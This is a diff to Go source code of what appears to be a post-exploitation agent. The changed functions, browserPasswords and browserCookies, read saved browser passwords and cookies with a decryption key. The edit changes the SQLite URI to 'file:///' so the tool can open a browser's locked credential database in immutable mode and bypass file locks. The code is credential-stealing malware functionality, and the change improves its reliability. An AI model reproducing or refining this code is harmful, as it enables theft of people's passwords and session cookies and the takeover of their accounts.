@@ -332,7 +332,7 @@ func browserPasswords(args browserArgs) structs.CommandResult {
 			}
 
 			// Strategy 2: Open locked DB directly in immutable mode
-			immutableURI := "file:" + filepath.ToSlash(loginDataPath) + "?immutable=1"
+			immutableURI := "file:///" + filepath.ToSlash(loginDataPath) + "?immutable=1"
 			creds, err := readLoginData(immutableURI, key, browserName, profileName)
 			if err != nil {
 				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
@@ -543,7 +543,7 @@ func browserCookies(args browserArgs) structs.CommandResult {
 
 			// Strategy 2: Open locked DB directly in immutable mode (no locking)
 			// URI format tells SQLite the file won't change, skipping all locks
-			immutableURI := "file:" + filepath.ToSlash(dbPath) + "?immutable=1"
+			immutableURI := "file:///" + filepath.ToSlash(dbPath) + "?immutable=1"
 			cookies, err := readCookieData(immutableURI, key, browserName, profileName)
 			if err != nil {
 				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
